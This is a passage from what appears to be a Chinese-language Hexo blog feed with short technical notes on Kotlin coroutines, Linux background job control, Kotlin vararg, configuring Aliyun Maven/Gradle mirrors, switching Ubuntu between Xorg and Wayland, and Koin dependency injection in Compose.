<h2 id="结构化并发"><a href="#结构化并发" class="headerlink" title="结构化并发"></a>结构化并发</h2><p>如果在同一个协程作用域内，那么只有该协程作用域内所有的协程都跑完才能结束这整个方法。（GlobalScope就不是该协程作用域）因此如果需要GlobalScope中拉起的协程不会提前终止，那么就需要将该拉起的协程加入到协程作用域内。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> = runBlocking &#123;</span><br><span class="line">	<span class="comment">//sampleStart</span></span><br><span class="line">    <span class="keyword">val</span> job = GlobalScope.launch &#123; <span class="comment">// launch a new coroutine and keep a reference to its Job</span></span><br><span class="line">        delay(<span class="number">1000L</span>)</span><br><span class="line">        println(<span class="string">&quot;World!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    println(<span class="string">&quot;Hello,&quot;</span>)</span><br><span class="line">    job.join() <span class="comment">// wait until child coroutine completes</span></span><br><span class="line">	<span class="comment">//sampleEnd    </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="作用域构建器"><a href="#作用域构建器" class="headerlink" title="作用域构建器"></a>作用域构建器</h2><p>runBlocking 和 coroutineScope 看起来很像，因为它们都需要等待其内部所有相同作用域的子协程结束后才会结束自己。两者的主要区别在于 runBlocking 方法会阻塞当前线程，而 coroutineScope 只是挂起并释放底层线程以供其它协程使用。由于这个差别，所以 runBlocking 是一个普通函数，而 coroutineScope 是一个挂起函数,挂起函数必须得在其他的协程作用域内才能调用。<br>launch 函数是 CoroutineScope 的扩展函数，而 runBlocking 的函数体参数也是被声明为 CoroutineScope 的扩展函数，所以 launch 函数就隐式持有了和 runBlocking 相同的协程作用域。</p>
<h2 id="挂起函数是可以被提取出来的"><a href="#挂起函数是可以被提取出来的" class="headerlink" title="挂起函数是可以被提取出来的"></a>挂起函数是可以被提取出来的</h2>  <figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> = runBlocking &#123;</span><br><span class="line">    launch &#123; doWorld() &#125;</span><br><span class="line">    println(<span class="string">&quot;Hello,&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is your first suspending function</span></span><br><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">doWorld</span><span class="params">()</span></span> &#123;</span><br><span class="line">    delay(<span class="number">1000L</span>)</span><br><span class="line">    println(<span class="string">&quot;World!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只需要加上suspend修饰符即可。</p>
<h2 id="全局协程类似于守护线程"><a href="#全局协程类似于守护线程" class="headerlink" title="全局协程类似于守护线程"></a>全局协程类似于守护线程</h2><p>因为当主程序终止时，他也会跟着终止。</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>协程</tag>
      </tags>
  </entry>
  <entry>
    <title>协程异步并发及结构化</title>
    <url>/posts/88c5a738/</url>
    <content><![CDATA[<h2 id="协程（3）"><a href="#协程（3）" class="headerlink" title="协程（3）"></a>协程（3）</h2><h3 id="默认顺序"><a href="#默认顺序" class="headerlink" title="默认顺序"></a>默认顺序</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> kotlinx.coroutines.*</span><br><span class="line"><span class="keyword">import</span> kotlin.system.*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> = runBlocking&lt;<span class="built_in">Unit</span>&gt; &#123;</span><br><span class="line">    <span class="comment">//sampleStart</span></span><br><span class="line">    <span class="keyword">val</span> time = measureTimeMillis &#123;</span><br><span class="line">        <span class="keyword">val</span> one = doSomethingUsefulOne()</span><br><span class="line">        <span class="keyword">val</span> two = doSomethingUsefulTwo()</span><br><span class="line">        println(<span class="string">&quot;The answer is <span class="subst">$&#123;one + two&#125;</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    println(<span class="string">&quot;Completed in <span class="variable">$time</span> ms&quot;</span>)</span><br><span class="line">    <span class="comment">//sampleEnd    </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">doSomethingUsefulOne</span><span class="params">()</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">    delay(<span class="number">1000L</span>) <span class="comment">// pretend we are doing something useful here</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">13</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">doSomethingUsefulTwo</span><span class="params">()</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">    delay(<span class="number">1000L</span>) <span class="comment">// pretend we are doing something useful here, too</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">29</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述代码中，他只拉起了一个协程。在协程内，他也是按顺序一个一个运行的。<br>因此他最后运行任然会有两秒的延迟。</p>
<blockquote>
<p>此外，即使他拉起了两个协程，他也是按照顺序或者时间片分片的方式执行（具体情况我并不清楚）。但是当他delay后，他会将现在的协程先挂起，让其他协程操作。但是同时也只能一个协程执行，也就同步操作。</p>
</blockquote>
<h3 id="async实现异步和并发"><a href="#async实现异步和并发" class="headerlink" title="async实现异步和并发"></a>async实现异步和并发</h3><p>当通过async来拉起协程时，他将会是一个异步的协程，此时你要通过await()来获取值。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> one = async &#123; doSomethingUsefulOne() &#125;</span><br><span class="line"><span class="keyword">val</span> two = async &#123; doSomethingUsefulTwo() &#125;</span><br></pre></td></tr></table></figure>
<h3 id="惰性启动-async"><a href="#惰性启动-async" class="headerlink" title="惰性启动 async"></a>惰性启动 async</h3><p>惰性启动即让程序员主动选择何时去拉起这个协程，通过start()和await()方法。<br>如果不使用start方法，那么他就是一个普通的协程。在async异步协程中，有await()的话，也会等待await()的结果先返回。</p>
<h3 id="结构化并发"><a href="#结构化并发" class="headerlink" title="结构化并发"></a>结构化并发</h3><p>因为 async 函数被定义为 CoroutineScope 上的一个扩展函数，所以我们需要将它放在 CoroutineScope 中，这就是  coroutineScope 函数提供的功能：<br>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">suspend fun failedConcurrentSum(): Int = coroutineScope &#123;</span><br><span class="line">    val one = async&lt;Int&gt; &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            delay(Long.MAX_VALUE) // Emulates very long computation</span><br><span class="line">            42</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            println(&quot;First child was cancelled&quot;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    val two = async&lt;Int&gt; &#123;</span><br><span class="line">        println(&quot;Second child throws an exception&quot;)</span><br><span class="line">        throw ArithmeticException()</span><br><span class="line">    &#125;</span><br><span class="line">    one.await() + two.await()</span><br><span class="line">&#125;</span><br><span class="line">这样，如果 ```concurrentSum()``` 函数发生错误并引发异常，则在其作用域中启动的所有协程都将被取消</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>协程</tag>
      </tags>
  </entry>
  <entry>
    <title>协程取消与异常处理</title>
    <url>/posts/5fa215f1/</url>
    <content><![CDATA[<h2 id="协程（2）"><a href="#协程（2）" class="headerlink" title="协程（2）"></a>协程（2）</h2><p>当我们需要取消协程时，我们可以通过对launch的返回值Job对象执行cancel()方法来取消协程。<br>但是当协程中正在执行计算相关的事件时，协程将不会被取消，而是会执行下去。因此即便取消了协程，任然要添加一个join()方法，避免协程没有正确取消和结束，而直接执行后面的操作。有一个简单的方法即cancelAndjoin()可以直接结合两个方法，取消并阻塞。<br>例如:</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> kotlinx.coroutines.*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> = runBlocking &#123;</span><br><span class="line">    <span class="comment">//sampleStart</span></span><br><span class="line">    <span class="keyword">val</span> startTime = System.currentTimeMillis()</span><br><span class="line">    <span class="keyword">val</span> job = launch(Dispatchers.Default) &#123;</span><br><span class="line">        <span class="keyword">var</span> nextPrintTime = startTime</span><br><span class="line">        <span class="keyword">var</span> i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">5</span>) &#123; <span class="comment">// computation loop, just wastes CPU</span></span><br><span class="line">            <span class="comment">// print a message twice a second</span></span><br><span class="line">            <span class="keyword">if</span> (System.currentTimeMillis() &gt;= nextPrintTime) &#123;</span><br><span class="line">                println(<span class="string">&quot;job: I&#x27;m sleeping <span class="subst">$&#123;i++&#125;</span> ...&quot;</span>)</span><br><span class="line">                nextPrintTime += <span class="number">500L</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    delay(<span class="number">1300L</span>) <span class="comment">// delay a bit</span></span><br><span class="line">    println(<span class="string">&quot;main: I&#x27;m tired of waiting!&quot;</span>)</span><br><span class="line">    job.cancelAndJoin() <span class="comment">// cancels the job and waits for its completion</span></span><br><span class="line">    println(<span class="string">&quot;main: Now I can quit.&quot;</span>)</span><br><span class="line">    <span class="comment">//sampleEnd    </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述例程中，协程便没有正确取消。但是你依然可以join等他结束后再执行最后一句话。</p>
<h2 id="使计算代码也能取消"><a href="#使计算代码也能取消" class="headerlink" title="使计算代码也能取消"></a>使计算代码也能取消</h2><p>再协程中有个属性<code>isActive</code>当协程任然在继续时，他变为true，当他被外界取消时，他便变为false，因此你可以通过他来关掉计算的过程，如下：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> kotlinx.coroutines.*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> = runBlocking &#123;</span><br><span class="line">    <span class="comment">//sampleStart</span></span><br><span class="line">    <span class="keyword">val</span> startTime = System.currentTimeMillis()</span><br><span class="line">    <span class="keyword">val</span> job = launch(Dispatchers.Default) &#123;</span><br><span class="line">        <span class="keyword">var</span> nextPrintTime = startTime</span><br><span class="line">        <span class="keyword">var</span> i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (isActive) &#123; <span class="comment">// cancellable computation loop</span></span><br><span class="line">            <span class="comment">// print a message twice a second</span></span><br><span class="line">            <span class="keyword">if</span> (System.currentTimeMillis() &gt;= nextPrintTime) &#123;</span><br><span class="line">                println(<span class="string">&quot;job: I&#x27;m sleeping <span class="subst">$&#123;i++&#125;</span> ...&quot;</span>)</span><br><span class="line">                nextPrintTime += <span class="number">500L</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    delay(<span class="number">1300L</span>) <span class="comment">// delay a bit</span></span><br><span class="line">    println(<span class="string">&quot;main: I&#x27;m tired of waiting!&quot;</span>)</span><br><span class="line">    job.cancelAndJoin() <span class="comment">// cancels the job and waits for its completion</span></span><br><span class="line">    println(<span class="string">&quot;main: Now I can quit.&quot;</span>)</span><br><span class="line">    <span class="comment">//sampleEnd    </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>在协程中，你同样可以使用try{}finally{}来实现取消协程时的回收操作。finally中的函数一定会实现。你甚至可以在finally中再调用一次协程，那并没有问题。通过withContext()方法</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> kotlinx.coroutines.*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> = runBlocking &#123;</span><br><span class="line">    <span class="comment">//sampleStart</span></span><br><span class="line">    <span class="keyword">val</span> job = launch &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            repeat(<span class="number">1000</span>) &#123; i -&gt;</span><br><span class="line">                println(<span class="string">&quot;job: I&#x27;m sleeping <span class="variable">$i</span> ...&quot;</span>)</span><br><span class="line">                delay(<span class="number">500L</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            withContext(NonCancellable) &#123;</span><br><span class="line">                println(<span class="string">&quot;job: I&#x27;m running finally&quot;</span>)</span><br><span class="line">                delay(<span class="number">1000L</span>)</span><br><span class="line">                println(<span class="string">&quot;job: And I&#x27;ve just delayed for 1 sec because I&#x27;m non-cancellable&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    delay(<span class="number">1300L</span>) <span class="comment">// delay a bit</span></span><br><span class="line">    println(<span class="string">&quot;main: I&#x27;m tired of waiting!&quot;</span>)</span><br><span class="line">    job.cancelAndJoin() <span class="comment">// cancels the job and waits for its completion</span></span><br><span class="line">    println(<span class="string">&quot;main: Now I can quit.&quot;</span>)</span><br><span class="line">    <span class="comment">//sampleEnd    </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h2><p>通过设置withTimeout来使超过时间的协程强行退出。<br>这种设置会导致抛出异常</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> kotlinx.coroutines.*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> = runBlocking &#123;</span><br><span class="line">    <span class="comment">//sampleStart</span></span><br><span class="line">    withTimeout(<span class="number">1300L</span>) &#123;</span><br><span class="line">        repeat(<span class="number">1000</span>) &#123; i -&gt;</span><br><span class="line">            println(<span class="string">&quot;I&#x27;m sleeping <span class="variable">$i</span> ...&quot;</span>)</span><br><span class="line">            delay(<span class="number">500L</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//sampleEnd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>协程</tag>
        <tag>kotin</tag>
      </tags>
  </entry>
  <entry>
    <title>后台进程管理命令</title>
    <url>/posts/1caafbcd/</url>
    <content><![CDATA[<p>一、后台进程管理命令</p>
<p>fg、bg、jobs、&amp;、ctrl + z、ctrl + c、ctrl + \、ctrl + d<br>1、 &amp;<br>加在一个命令的最后，可以把这个命令放到后台执行 ,如gftp &amp;,<br>2、ctrl + z<br>可以将一个正在前台执行的命令放到后台，并且处于暂停状态，不可执行<br>3、jobs<br>查看当前有多少在后台运行的命令<br>jobs -l选项可显示所有任务的PID，jobs的状态可以是running, stopped, Terminated,但是如果任务被终止了（kill），shell 从当前的shell环境已知的列表中删除任务的进程标识；也就是说，jobs命令显示的是当前shell环境中所起的后台正在运行或者被挂起的任务信息；<br>4、fg<br>将后台中的命令调至前台继续运行<br>如果后台中有多个命令，可以用 fg %jobnumber将选中的命令调出，%jobnumber是通过jobs命令查到的后台正在执行的命令的序号(不是pid)<br>5、bg<br>将一个在后台暂停的命令，变成继续执行 （在后台执行）<br>如果后台中有多个命令，可以用bg %jobnumber将选中的命令调出，%jobnumber是通过jobs命令查到的后台正在执行的命令的序号(不是pid)<br>将任务转移到后台运行：<br>先ctrl + z；再bg，这样进程就被移到后台运行，终端还能继续接受命令。<br>概念：当前任务<br>如果后台的任务号有2个，[1],[2]；如果当第一个后台任务顺利执行完毕，第二个后台任务还在执行中时，当前任务便会自动变成后台任务号码“[2]” 的后台任务。所以可以得出一点，即当前任务是会变动的。当用户输入“fg”、“bg”和“stop”等命令时，如果不加任何引号，则所变动的均是当前任务</p>
<p>二、进程的终止<br>后台进程的终止：<br>方法一：<br>通过jobs命令查看job号（假设为num），然后执行kill %num<br>方法二：<br>通过ps命令查看job的进程号（PID，假设为pid），然后执行kill pid<br>前台进程的终止：<br>ctrl+c</p>
<p>三、进程的挂起（暂停的意思吧）<br>后台进程的挂起：<br>在solaris中通过stop命令执行，通过jobs命令查看job号(假设为num)，然后执行stop %num；<br>在redhat中，不存在stop命令，可通过执行命令kill -stop PID，将进程挂起；<br>当要重新执行当前被挂起的任务时，通过bg %num 即可将挂起的job的状态由stopped改为running，仍在后台执行；当需要改为在前台执行时，执行命令fg %num即可；<br>前台进程的挂起：<br>ctrl+Z;</p>
<p>四、kill的其他作用<br>kill除了可以终止进程，还能给进程发送其它信号，使用kill -l 可以察看kill支持的信号。<br>SIGTERM是不带参数时kill发送的信号，意思是要进程终止运行，但执行与否还得看进程是否支持。如果进程还没有终止，可以使用kill -SIGKILL pid，这是由内核来终止进程，进程不能监听这个信号。</p>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>可变长参数函数vararg</title>
    <url>/posts/6b922cbb/</url>
    <content><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>fun函数也可以用public来修饰</p>
<h2 id="可变长参数函数vararg"><a href="#可变长参数函数vararg" class="headerlink" title="可变长参数函数vararg"></a>可变长参数函数vararg</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    println(<span class="string">&quot;hello,world&quot;</span>)</span><br><span class="line">    print(sum(<span class="number">1</span>,<span class="number">4</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">23</span>,<span class="number">52</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">fun</span> <span class="title">sum</span><span class="params">( a:<span class="type">Int</span>,<span class="keyword">vararg</span> b:<span class="type">Int</span>)</span></span>:<span class="built_in">Int</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = a</span><br><span class="line">    <span class="keyword">for</span> (bn <span class="keyword">in</span> b)&#123;</span><br><span class="line">        result += bn</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>vararg既可以一个一个的传入参数，也可以将一个定义好的数组当作参数传入，可以用*前缀来引用该数组</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>国内镜像源配置：Maven，Gradle，Kotlin</title>
    <url>/posts/1864f5d9/</url>
    <content><![CDATA[<h1 id="配置国内镜像源"><a href="#配置国内镜像源" class="headerlink" title="配置国内镜像源"></a>配置国内镜像源</h1><h2 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h2><h3 id="全局配置："><a href="#全局配置：" class="headerlink" title="全局配置："></a>全局配置：</h3><p>在Maven的安装目录下的<code>conf/settings.xml</code>添加mirror源</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">settings</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 添加以下这段 Mirror 配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Aliyun --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>      </span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="单项目配置"><a href="#单项目配置" class="headerlink" title="单项目配置"></a>单项目配置</h3><p>修改项目中的pom.xml文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Gradle"><a href="#Gradle" class="headerlink" title="Gradle"></a>Gradle</h2><h3 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h3><p>在 <code>$&#123;USER_HOME&#125;/.gradle/</code> 目录下创建 init.gradle 文件，添加以下内容：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">allprojects</span> &#123;</span><br><span class="line">    <span class="keyword">repositories</span> &#123;</span><br><span class="line">        <span class="keyword">def</span> ALIYUN_REPOSITORY_URL = <span class="string">&#x27;https://maven.aliyun.com/repository/public&#x27;</span></span><br><span class="line">        all &#123; ArtifactRepository repo -&gt;</span><br><span class="line">            <span class="keyword">if</span>(repo <span class="keyword">instanceof</span> MavenArtifactRepository)&#123;</span><br><span class="line">                <span class="keyword">def</span> url = repo.url.toString()</span><br><span class="line">                <span class="keyword">if</span> (url.startsWith(<span class="string">&#x27;https://repo1.maven.org/maven2&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">project</span>.logger.lifecycle <span class="string">&quot;Repository $&#123;repo.url&#125; replaced by $ALIYUN_REPOSITORY_URL.&quot;</span></span><br><span class="line">                    remove repo</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        maven &#123; url ALIYUN_REPOSITORY_URL &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>单项目配置<br>修改项目的 <code>build.gradle</code> 文件，添加以下内容：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">repositories</span> &#123;</span><br><span class="line">    maven &#123; url <span class="string">&#x27;https://maven.aliyun.com/repository/public&#x27;</span> &#125;</span><br><span class="line">    mavenCentral()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="特别的，在kotlin的项目中，需要使用不同的方法。"><a href="#特别的，在kotlin的项目中，需要使用不同的方法。" class="headerlink" title="特别的，在kotlin的项目中，需要使用不同的方法。"></a>特别的，在<code>kotlin</code>的项目中，需要使用不同的方法。</h2><p>在<code>build.gradle.kts</code>里，加入以下内容</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">repositories</span> &#123;</span><br><span class="line">    <span class="comment">// 依赖使用阿里云 maven 源</span></span><br><span class="line">    maven &#123;</span><br><span class="line">        setUrl(<span class="string">&quot;https://maven.aliyun.com/repository/public/&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    maven &#123;</span><br><span class="line">        setUrl(<span class="string">&quot;https://maven.aliyun.com/repository/spring/&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    mavenLocal()</span><br><span class="line">    mavenCentral()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>引用自<a href="https://www.jianshu.com/p/068475607946">1</a><a href="https://zixizixi.cn/gradle-maven-kotlin-groovy-config">2</a></p>
</blockquote>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>gradle</tag>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title>在 Ubuntu 中切换 Xorg 和 Wayland</title>
    <url>/posts/98ff967b/</url>
    <content><![CDATA[<p>只要在登陆时，在右下角有个设置选项，通过这个选项就可以切换了</p>
<p>如果已经进入桌面需要先注销在重新登入</p>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>ubuntu桌面端</tag>
      </tags>
  </entry>
  <entry>
    <title>在 Compose 中使用 Koin 进行依赖注入</title>
    <url>/posts/8e2f3ca0/</url>
    <content><![CDATA[<h2 id="导入包"><a href="#导入包" class="headerlink" title="导入包"></a>导入包</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">implementation (<span class="string">&quot;io.insert-koin:koin-androidx-compose:3.4.5&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="在app中安装koin"><a href="#在app中安装koin" class="headerlink" title="在app中安装koin"></a>在app中安装koin</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RainDropApp</span>:<span class="type">Application</span>()&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate()</span><br><span class="line"></span><br><span class="line">        startKoin &#123;</span><br><span class="line">            androidLogger(Level.INFO)</span><br><span class="line">            androidContext(<span class="keyword">this</span><span class="symbol">@RainDropApp</span>)</span><br><span class="line">            modules(Appmodule)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后看你安装的module</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> Appmodule = module &#123;</span><br><span class="line">    single &#123; MediaReaderImpl(<span class="keyword">get</span>()) <span class="keyword">as</span> MediaReader &#125;</span><br><span class="line">    single &#123; AudioPlayerImpl(<span class="keyword">get</span>()) <span class="keyword">as</span> AudioPlayer &#125;</span><br><span class="line">    viewModel &#123;</span><br><span class="line">        LocalMusicViewModel(<span class="keyword">get</span>())</span><br><span class="line">    &#125;</span><br><span class="line">    viewModel &#123;</span><br><span class="line">        HomeViewModel(<span class="keyword">get</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="注入基本对象"><a href="#注入基本对象" class="headerlink" title="注入基本对象"></a>注入基本对象</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 简单的一个日志输出类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Logger</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">print</span><span class="params">(msg: <span class="type">String</span>)</span></span> &#123;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Logger print: <span class="variable">$msg</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> module = module &#123;</span><br><span class="line">  	<span class="comment">// 设置它的注入类型为单例</span></span><br><span class="line">    single &#123; Logger() &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Composable</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">Greeting</span><span class="params">(name: <span class="type">String</span>, modifier: <span class="type">Modifier</span> = Modifier)</span></span> &#123;</span><br><span class="line">  	<span class="comment">// 通过 koin 的 koinInject()方法进行对象注入</span></span><br><span class="line">    <span class="keyword">val</span> logger: Logger = koinInject()</span><br><span class="line"></span><br><span class="line">    Text(</span><br><span class="line">        text = <span class="string">&quot;Hello <span class="variable">$name</span>!&quot;</span>,</span><br><span class="line">        modifier = modifier.clickable &#123; logger.print(<span class="string">&quot;greeting&quot;</span>) &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 日志输出</span><br><span class="line">Logger print: greeting</span><br></pre></td></tr></table></figure>
<p>从上面的代码中可以看到，module{}在普通工程和 compose 工程中用法是一致的，只是在获取依赖对象时，compose 中需要使用 koinInject() 方法来获取，此方法也是被@Composable修饰，并且通过remember()来完成内部逻辑实现。</p>
<p>更详细的内容请查看原文，因为他确实不难理解。</p>
<blockquote>
<p>引用自<a href="https://juejin.cn/post/7252246218290118714">掘金</a></p>
</blockquote>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
  </entry>
  <entry>
    <title>在 Ubuntu 服务器 22.04 上设置静态 IP 地址</title>
    <url>/posts/2f993e/</url>
